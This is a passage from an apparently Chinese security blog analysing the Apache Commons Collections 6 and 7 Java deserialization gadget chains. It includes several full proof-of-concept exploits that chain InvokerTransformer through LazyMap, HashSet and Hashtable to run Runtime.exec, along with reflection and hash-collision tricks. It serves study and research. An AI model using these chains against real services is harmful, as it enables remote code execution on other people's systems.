import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException &#123;

        /*
         * 客户端构造payload，并序列化文件
         * */
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;leihehe&quot;);//让TiedMapEntry里的map为lazyMap,key随意
        Map serMap = new HashMap();
        serMap.put(tiedMapEntry,&quot;111&quot;);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(serMap);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
//        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
//        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
//        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<p>奇怪的是，我们并没有反序列化，但计算器依然弹出来了，说明这里某处又触发了一次命令执行。</p>
<h5 id="HashMap-put-的问题"><a href="#HashMap-put-的问题" class="headerlink" title="HashMap.put()的问题"></a>HashMap.put()的问题</h5><p>还记得我们之前查找哪些地方调用了HashMap.hash()吗，那里貌似出现了很多地方调用。其中一个地方 <code>put()</code>方法里，也对<code>hash()</code>进行了调用，<strong>正好我们要在生成payload的时候put进key-value对</strong>，那该怎样才能让他在生成payload的时候不触发？</p>
<pre><code class="java">    public V put(K key, V value) &#123;
        if (table == EMPTY_TABLE) &#123;
            inflateTable(threshold);
        &#125;
        if (key == null)
            return putForNullKey(value);
        int hash = hash(key);//这里也调用了hash，导致后面漏洞触发了。
        int i = indexFor(hash, table.length);
        for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123;//把key-value放入Entry&lt;K,V&gt;
            Object k;
            if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123;
                V oldValue = e.value;
                e.value = value;
                e.recordAccess(this);
                return oldValue;
            &#125;
        &#125;

        modCount++;
        addEntry(hash, key, value, i);
        return null;
    &#125;
</code></pre>
<hr>
<p>其实刚开始分析的时候总觉得这一幕似曾相识，感觉好像自己之前分析过<code>put</code>重复执行命令的这种类似的情况。后来去网上查了下，发现这不是<strong>URLDNS</strong>的内容吗？</p>
<p>因为触发的地方在<code>LazyMap.get() -&gt; ChainedTransformer.transform()</code></p>
<p>所以我们可以在构造LazyMap的时候让他执行一个无效的ChainedTransformer,然后最后再传入真正有用的<code>transformer</code></p>
<p><strong>POC如下：</strong></p>
<pre><code class="java">public class CommonsCollections6 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;

        /*
         * 客户端构造payload，并序列化文件
         * */

        //写一个fake的trasnformers
        Transformer[] fakeTransformers = new Transformer[]&#123;
                new ConstantTransformer(String.class)
        &#125;;
        //这是真的transformer
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;leihehe&quot;);//让TiedMapEntry里的map为lazyMap,key随意
        Map serMap = new HashMap();
        serMap.put(tiedMapEntry,&quot;111&quot;);
        
        /* 把有用的transformer换回来 */
        Field myTransformers = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
        myTransformers.setAccessible(true);
        myTransformers.set(chainedTransformer,transformers);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(serMap);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<p>奇怪的是，序列化时不弹计算器了，可是反序列化的时候也没有弹计算器 -》 我们没有成功触发漏洞。</p>
<p>问题出在哪里呢？</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204162857604.png" alt="image-20211204162857604"></p>
<p>我们发现执行到<code>putForCreate</code>的时候，被传过去的key值是<code>TiedMapEntry</code>中的key值，而并非我们想要的<code>tiedMapEntry</code>，所以我们猜测某个地方将<code>TiedMapEntry</code>中的key值给加到map里去了。</p>
<p>跟踪后发现问题出在<strong>LazyMap.get():</strong></p>
<pre><code class="java">    public Object get(Object key) &#123;
        if (!super.map.containsKey(key)) &#123;
            Object value = this.factory.transform(key);
            super.map.put(key, value);
            return value;
        &#125; else &#123;
            return super.map.get(key);
        &#125;
    &#125;
</code></pre>
<p>在这里我们的factory是<code>fakeTransform</code>,key是<code>leihehe</code>，在<code>super.map.put(key, value);</code>处，TiedMapEntry被添加了一个key值</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183033871.png" alt="image-20211204183033871"></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204183536474.png" alt="image-20211204183536474"></p>
<p>导致反序列化漏洞触发失败。</p>
<p>所以我们的<strong>解决方法</strong>如下：</p>
<pre><code class="java">lazyMap.remove(&quot;leihehe&quot;);
</code></pre>
<h5 id="POC构造"><a href="#POC构造" class="headerlink" title="POC构造"></a>POC构造</h5><pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import javax.management.BadAttributeValueExpException;
import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.Map;

public class CommonsCollections6 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;

        /*
         * 客户端构造payload，并序列化文件
         * */

        //写一个fake的trasnformers
        Transformer[] fakeTransformers = new Transformer[]&#123;
                new ConstantTransformer(String.class)
        &#125;;
        //这是真的transformer
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(fakeTransformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;leihehe&quot;);//让TiedMapEntry里的map为lazyMap,key随意
        Map serMap = new HashMap();
        serMap.put(tiedMapEntry,&quot;111&quot;);
        lazyMap.remove(&quot;leihehe&quot;);
        /* 把有用的transformer换回来 */
        Field myTransformers = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
        myTransformers.setAccessible(true);
        myTransformers.set(chainedTransformer,transformers);
        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(serMap);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211204184034975.png" alt="image-20211204184034975"></p>
<h4 id="调用hash-处二（方法二）："><a href="#调用hash-处二（方法二）：" class="headerlink" title="调用hash()处二（方法二）："></a>调用hash()处二（方法二）：</h4><h5 id="HashSet"><a href="#HashSet" class="headerlink" title="HashSet"></a>HashSet</h5><p>经过分析，我们发现<code>HashMap.put()</code>方法也会导致利用链触发（也正是它给我们在方法一的实现中带来了坑）</p>
<p>那么我们有没有什么办法直接让程序call到<code>HashMap.put()</code>，就让它成为利用链中一部分呢？</p>
<p><code>HashSet</code>成为了我们的首选。</p>
<h5 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a>HashSet.readObject()</h5><p>我们发现<code>HashSet.readObject()</code>中call 到了put()方法</p>
<pre><code class="java">    private void readObject(java.io.ObjectInputStream s)
        throws java.io.IOException, ClassNotFoundException &#123;
        // Read in any hidden serialization magic
        s.defaultReadObject();

        // Read in HashMap capacity and load factor and create backing HashMap
        int capacity = s.readInt();
        float loadFactor = s.readFloat();
        
        /* 此处判断是否为LinkedHashSet类型，如果不是就创建HashMap */
        map = (((HashSet)this) instanceof LinkedHashSet ?
               new LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :
               new HashMap&lt;E,Object&gt;(capacity, loadFactor));

        // Read in size
        int size = s.readInt();

        // Read in all elements in the proper order.
        for (int i=0; i&lt;size; i++) &#123;
            E e = (E) s.readObject();
            map.put(e, PRESENT);//这里call到了put
        &#125;
    &#125;
</code></pre>
<p>如果我们能让<code>map</code>变量为我们的HashMap就能连上了。我们发现在该方法下会重建一个新的map，而这个map就是<strong>HashMap</strong>类型。 如果我们直接把这个内部的<strong>HashMap</strong>拿来用，把这个内部的<strong>HashMap</strong>的key值改为<strong>tiedMapEntry</strong>，当他被call <code>put()</code>的时候，利用链就能被成功执行了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211205094232431.png" alt="image-20211205094232431"></p>
<p>我们跟到<code>HashSet.readObject()</code>看一下，看看这个<code>e</code>是怎么来的</p>
<pre><code class="java">    private void writeObject(java.io.ObjectOutputStream s)
        throws java.io.IOException &#123;
        // Write out any hidden serialization magic
        s.defaultWriteObject();

        // Write out HashMap capacity and load factor
        s.writeInt(map.capacity());
        s.writeFloat(map.loadFactor());

        // Write out size
        s.writeInt(map.size());

        // Write out all elements in the proper order.
        for (E e : map.keySet())//e是通过hashmap的keySet来的
            s.writeObject(e);//e被序列化了
    &#125;
</code></pre>
<p>这就很明显了，它会把变量<code>map</code>里的<code>key-value</code>对给序列化，如果我们变量<code>map</code>已经有值，那么它的内容就会被序列化 -》从而在readObject()反序列化的时候这些内容又会被反序列化从而触发漏洞 -》 这里引出后面的用反射修改<code>map</code>。</p>
<h5 id="HashSet-add"><a href="#HashSet-add" class="headerlink" title="HashSet.add()"></a>HashSet.add()</h5><p><code>HashSet.add()</code>会向map(hashmap)中添加一个key</p>
<pre><code class="java">public boolean add(E e) &#123;
    return map.put(e, PRESENT)==null;
&#125;
</code></pre>
<h5 id="POC构造-1"><a href="#POC构造-1" class="headerlink" title="POC构造"></a>POC构造</h5><p>我们已经得知，HashSet中会生成一个HashMap，所以我们不再需要自己构造了HashMap了。我们的思路如下：先用hashSet生成一个带任意key值的hashMap，我们用反射的方式得到这个map，最后再用反射的方式从这个<strong>map</strong>中修改<strong>key</strong>。</p>
<p>在HashMap中，键值对是被存储在<code>table</code>变量中的，这个看代码直接能看出来。</p>
<p><strong>完整POC如下</strong></p>
<pre><code class="java">import org.apache.commons.collections.Transformer;
import org.apache.commons.collections.functors.ChainedTransformer;
import org.apache.commons.collections.functors.ConstantTransformer;
import org.apache.commons.collections.functors.InvokerTransformer;
import org.apache.commons.collections.keyvalue.TiedMapEntry;
import org.apache.commons.collections.map.LazyMap;

import java.io.*;
import java.lang.reflect.Field;
import java.util.HashMap;
import java.util.HashSet;
import java.util.Map;

public class CommonsCollections6Method2 &#123;
    public static void main(String[] args) throws IOException, ClassNotFoundException, NoSuchFieldException, IllegalAccessException &#123;

        /*
         * 客户端构造payload，并序列化文件
         * */

        //这是真的transformer
        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(transformers);
        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        TiedMapEntry tiedMapEntry = new TiedMapEntry(lazyMap,&quot;leihehe&quot;);//让TiedMapEntry里的map为lazyMap,key随意

        //创建HashSet的时候，其内部已经创建了一个hashmap，我们只需要把这个内部生成的hashmap的key值改为tiedMapEntry，当他被call put的时候，利用链就成功执行了。

        HashSet hashSet = new HashSet();
        hashSet.add(&quot;111&quot;);//先随意给内部的map添加一个key
        Field map = hashSet.getClass().getDeclaredField(&quot;map&quot;);//得到这个map Field
        map.setAccessible(true);
        HashMap mapInHashSet = (HashMap) map.get(hashSet);//得到这个map的内容 -》也就是hashMap

        Field table = mapInHashSet.getClass().getDeclaredField(&quot;table&quot;);//从这个hashmap中获取table field
        table.setAccessible(true);
        Object[] array = (Object[]) table.get(mapInHashSet);//这个table field里面包含了由各种键值对组成的数组
        // 我们的目的是修改那个我们之前放进去的key值，让他等于tiedMapEntry

        Object node = array[0];
        for (Object i : array)&#123;//遍历这个键值对数组，如果不为空，就赋值给node，从而得到一对键值对
            if(i!=null)&#123;
                node=i;
                break;
            &#125;
        &#125;
        /* 修改其中的key值 */
        Field key = node.getClass().getDeclaredField(&quot;key&quot;);
        key.setAccessible(true);
        key.set(node,tiedMapEntry);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashSet);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
    &#125;
&#125;
</code></pre>
<h3 id="总结-2"><a href="#总结-2" class="headerlink" title="总结"></a>总结</h3><p>cc6中用<code>fakeTransformer</code>来绕过命令重复执行可以说是非常好的思路了，自己在审计的时候也可以学习这方面思路。</p>
<h3 id="Reference-4"><a href="#Reference-4" class="headerlink" title="Reference"></a>Reference</h3><p><a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/233410#h3-8">ysoserial CommonsCollections5/6 详细分析</a></p>
<p><a target="_blank" rel="noopener" href="https://reader-l.github.io/2021/04/27/Java%E5%AE%89%E5%85%A8-CommonsCollections6%E5%88%A9%E7%94%A8%E9%93%BE%E5%88%86%E6%9E%90/">Java安全-CommonsCollections6利用链分析</a></p>
<h2 id="Commons-Collections-7"><a href="#Commons-Collections-7" class="headerlink" title="Commons Collections 7"></a>Commons Collections 7</h2><h3 id="环境搭建-6"><a href="#环境搭建-6" class="headerlink" title="环境搭建"></a>环境搭建</h3><ul>
<li>commons-collections:3.1-3.2.1</li>
<li>jdk1.7</li>
</ul>
<h3 id="利用链构造-3"><a href="#利用链构造-3" class="headerlink" title="利用链构造"></a>利用链构造</h3><h4 id="前言-2"><a href="#前言-2" class="headerlink" title="前言"></a>前言</h4><p><code>LazyMap.get()</code>之后得步骤和之前的cc链都差不多，这里就不再说了。</p>
<h4 id="AbstractMap-equals"><a href="#AbstractMap-equals" class="headerlink" title="AbstractMap.equals()"></a>AbstractMap.equals()</h4><p>我们在<code>AbstractMap.equals()</code>中发现了<code>.get()</code>方法</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206194914358.png" alt="image-20211206194914358"></p>
<p>如果我们能够控制变量<code>m</code>为lazyMap的话，就能连上利用链了。</p>
<p>那么什么调用了<code>AbstractMap.equals()</code>呢？</p>
<h4 id="Hashtable-reconstitutionPut"><a href="#Hashtable-reconstitutionPut" class="headerlink" title="Hashtable.reconstitutionPut()"></a>Hashtable.reconstitutionPut()</h4><p>我们发现在<code>Hashtable</code>中，<code>reconstitutionPut()</code>方法调用了<code>e.key.equals()</code>，既然我们想要call到<code>AbstractMap.equals()</code>,那我们让传入的<strong>e.key</strong>变成<code>AbstractMap</code>是不是就可以了呢？</p>
<pre><code class="java">private void reconstitutionPut(Entry&lt;K,V&gt;[] tab, K key, V value)
    throws StreamCorruptedException
&#123;
    if (value == null) &#123;
        throw new java.io.StreamCorruptedException();
    &#125;
    // Makes sure the key is not already in the hashtable.
    // This should not happen in deserialized version.
    int hash = hash(key);
    int index = (hash &amp; 0x7FFFFFFF) % tab.length;
    for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123;
        //e=传入table里的第一个key-value对
        if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;//此处调用了equals()
            throw new java.io.StreamCorruptedException();
        &#125;
    &#125;
    // Creates the new entry.
    Entry&lt;K,V&gt; e = tab[index];
    tab[index] = new Entry&lt;&gt;(hash, key, value, e);
    count++;
&#125;
</code></pre>
<p>我们发现<code>HashMap</code>继承了<code>AbstractMap</code>，如果我们的变量<code>e</code>为<code>lazyMap</code>，它的key值则为<code>hashMap</code>，从而我们会call到**hashMap的equals()**，就能触发漏洞了。</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206200746114.png" alt="image-20211206200746114"></p>
<h4 id="Hashtable-readObject"><a href="#Hashtable-readObject" class="headerlink" title="Hashtable.readObject()"></a>Hashtable.readObject()</h4><p>跟踪发现<code>reconstitutionPut()</code>刚好会被<code>Hashtable.readObject()</code>所调用。此处的<code>newTable</code>是新的，我们无法赋值，但是在<code>reconstitutionPut()</code>方法中，我们可以看到在for循环后面，有一句<code>tab[index] = new Entry&lt;&gt;(hash, key, value, e);</code></p>
<p>这是将我们的key-value对存入这个<strong>tab</strong>中，而这个tab正好对应了<code>readObjcet()</code>里的<strong>newTable</strong></p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206201003311.png" alt="image-20211206201003311"></p>
<hr>
<p><strong>遇到的一些困惑：</strong></p>
<p>起初我很疑惑<strong>newTable</strong>和<strong>tab</strong>的关系，后来我明白了，<strong>newTable</strong>作为参数<strong>tab</strong>传入<code>reconstitutionPut()</code>后，在<code>reconstitutionPut()</code>中对<strong>tab</strong>的变化也是会影响到<strong>newTable</strong>的 - 也就是所谓的<strong>sideffect</strong>，下面我做了个实验：</p>
<pre><code class="java">public class Person &#123;
    public static void main(String[] args) &#123;
        Teacher teacher = new Teacher(28);//创建一个28岁的老师
        Student student = new Student(teacher);//把老师的instance传给学生
        //学生会把传给它的老师改成53岁
        System.out.println(teacher.getAge());//打印老师的年龄
        //输出结果为53岁
    &#125;
&#125;

public class Student &#123;
    public Student(Teacher teacher)&#123;
        teacher.modifyAge(53);
    &#125;
&#125;

public class Teacher &#123;
    private int age=0;

    public Teacher(int age) &#123;
        this.age = age;
    &#125;
    public void modifyAge(int age)&#123;
        this.age = age;
    &#125;

    public int getAge() &#123;
        return age;
    &#125;
&#125;
</code></pre>
<hr>
<p>再看<code>Hashtable.writeObject()</code></p>
<pre><code class="java">    private void writeObject(java.io.ObjectOutputStream s)
            throws IOException &#123;
        Entry&lt;K, V&gt; entryStack = null;

        synchronized (this) &#123;
            // Write out the length, threshold, loadfactor
            s.defaultWriteObject();

            // Write out length, count of elements
            s.writeInt(table.length);
            s.writeInt(count);

            // Stack copies of the entries in the table
            for (int index = 0; index &lt; table.length; index++) &#123;
                Entry&lt;K,V&gt; entry = table[index];

                while (entry != null) &#123;
                    entryStack =
                        new Entry&lt;&gt;(0, entry.key, entry.value, entryStack);
                    entry = entry.next;
                &#125;
            &#125;
        &#125;

        // Write out the key/value objects from the stacked entries
        while (entryStack != null) &#123;
            s.writeObject(entryStack.key);
            s.writeObject(entryStack.value);
            entryStack = entryStack.next;
        &#125;
    &#125;
</code></pre>
<p>这里将Hashtable里的key-value对给序列化了。</p>
<p>因此我们只需要构造key值为<strong>lazyMap</strong>就可以了。</p>
<p>我们初步的POC如下：</p>
<pre><code class="java">        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
</code></pre>
<p>但是这个POC是有问题的。</p>
<h4 id="两个LazyMap"><a href="#两个LazyMap" class="headerlink" title="两个LazyMap"></a>两个LazyMap</h4><p>在<code>Hashtable.reconstitutionPut()</code>中，<strong>for循环</strong>里触发了我们的利用链。但如果我们<strong>tab</strong>里只有一个key-value对，那么就不会再触发了，因为第一次加入key-value对时tab里面没有值，是不会进入for循环的。</p>
<pre><code class="java">        for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123;
            //如果tab里为空，不会进入for循环
            if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;
                throw new java.io.StreamCorruptedException();
            &#125;
        &#125;
        // 只会直接添加key-value到这个tab里
        Entry&lt;K,V&gt; e = tab[index];
        tab[index] = new Entry&lt;&gt;(hash, key, value, e);
        count++;
</code></pre>
<p>所以我们需要添加两个<strong>lazyMap</strong>,而第二个<strong>lazyMap</strong>才能让我们进入<strong>for循环</strong></p>
<p>改进后POC如下</p>
<pre><code class="java">        Map innerMap = new HashMap();
        innerMap.put(&quot;1&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap
        Map innerMap2 = new HashMap();
        innerMap2.put(&quot;3&quot;,&quot;4&quot;);
        Map lazyMap = LazyMap.decorate(innerMap2,chainedTransformer);//return a new lazyMap
        
        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap,2);
</code></pre>
<p>可是这样的POC依然不对。</p>
<h4 id="一样的hash"><a href="#一样的hash" class="headerlink" title="一样的hash"></a>一样的hash</h4><p>依然是for循环的毛病</p>
<pre><code class="java">int hash = hash(key);
int index = (hash &amp; 0x7FFFFFFF) % tab.length;
for (Entry&lt;K,V&gt; e = tab[index] ; e != null ; e = e.next) &#123;
    //如果tab里为空，不会进入for循环
    if ((e.hash == hash) &amp;&amp; e.key.equals(key)) &#123;
        throw new java.io.StreamCorruptedException();
    &#125;
&#125;
</code></pre>
<p>假设我们现在已经put了第一个key-value对，现在tab的内容如下</p>
<ul>
<li><code>&lt;lazyMap,1&gt;</code></li>
</ul>
<p>当我们用第二个<code>&lt;lazyMap2,2&gt;</code>开始执行<strong>for loop</strong>的时候，会判断<strong>tab[index]<strong>是否为空，如果tab里面不存在，那么就不能进入</strong>for循环</strong>（太坑了）- 意味着我们第一次的**hash(key)<strong>和第二次的</strong>hash(key)**必须一样</p>
<p>经测试当lazyMap的key值为xx和zZ时，得到的hashCode是一样的，所以我们能够进入for循环</p>
<p>现在的POC：</p>
<pre><code class="java">        Map innerMap = new HashMap();
        innerMap.put(&quot;yy&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        Map innerMap2 = new HashMap();
        innerMap2.put(&quot;zZ&quot;,&quot;2&quot;);
        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);//return a new lazyMap


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap2,2);
</code></pre>
<h4 id="Fake-Transformer"><a href="#Fake-Transformer" class="headerlink" title="Fake Transformer"></a>Fake Transformer</h4><p>和cc6差不多，我们在执行**hashtable.put()**时，同样会触发利用链</p>
<p><img src="https://blog-1300132498.cos.ap-nanjing.myqcloud.com/blog/image-20211206205356150.png" alt="image-20211206205356150"></p>
<p>那么我们只需要先传入一个<strong>fakeTransformer</strong>，最后再改回来就好了</p>
<pre><code class="java">        /*
         * 客户端构造payload，并序列化文件
         * */

        Transformer[] transformers = new Transformer[]&#123;
                new ConstantTransformer(Runtime.class),//返回Runtime Class
                //获取getRuntime方法
                new InvokerTransformer(&quot;getDeclaredMethod&quot;, new Class[]&#123;String.class,Class[].class&#125;, new Object[]&#123;&quot;getRuntime&quot;,null&#125;),
                //call getRuntime方法得到Runtime实例
                new InvokerTransformer(&quot;invoke&quot;, new Class[]&#123;Object.class,Object[].class&#125;, new Object[]&#123;null,null&#125;),
                //创建invokerTransformer，并利用constructor对iMethodName、iParamTypes、iArgs进行赋值
                new InvokerTransformer(&quot;exec&quot;, new Class[]&#123;String.class&#125;, new String[]&#123;&quot;calc&quot;&#125;)
        &#125;;
        //将上面的数组用chainedTransformer串起来，数组里的transformer会被挨个执行transform()方法
        ChainedTransformer chainedTransformer = new ChainedTransformer(new Transformer[]&#123;&#125;);//这里我们传入假的transformer，实际为空

        Map innerMap = new HashMap();
        innerMap.put(&quot;yy&quot;,&quot;2&quot;);
        Map lazyMap = LazyMap.decorate(innerMap,chainedTransformer);//return a new lazyMap

        Map innerMap2 = new HashMap();
        innerMap2.put(&quot;zZ&quot;,&quot;2&quot;);
        Map lazyMap2 = LazyMap.decorate(innerMap2,chainedTransformer);//return a new lazyMap


        Hashtable hashtable = new Hashtable();
        hashtable.put(lazyMap,1);
        hashtable.put(lazyMap2,2);

        Field field = chainedTransformer.getClass().getDeclaredField(&quot;iTransformers&quot;);
        field.setAccessible(true);
        field.set(chainedTransformer,transformers);

        //序列化
        FileOutputStream fileOutputStream = new FileOutputStream(&quot;lz.cer&quot;);
        ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream);
        objectOutputStream.writeObject(hashtable);//序列化
        objectOutputStream.flush();
        objectOutputStream.close();
        fileOutputStream.close();
        /*
         * 服务端反序列化读取，并触发漏洞
         * */
        //反序列化
        FileInputStream fileInputStream = new FileInputStream(&quot;lz.cer&quot;);
        ObjectInputStream objectInputStream = new ObjectInputStream(fileInputStream);
        objectInputStream.readObject();//只需要readObject()就会触发漏洞
</code></pre>
<p>原本以为这样就结束了，结果计算器又不跳出来了。还记得<strong>cc6</strong>吗，我们出现的问题和这个一模一样</p>
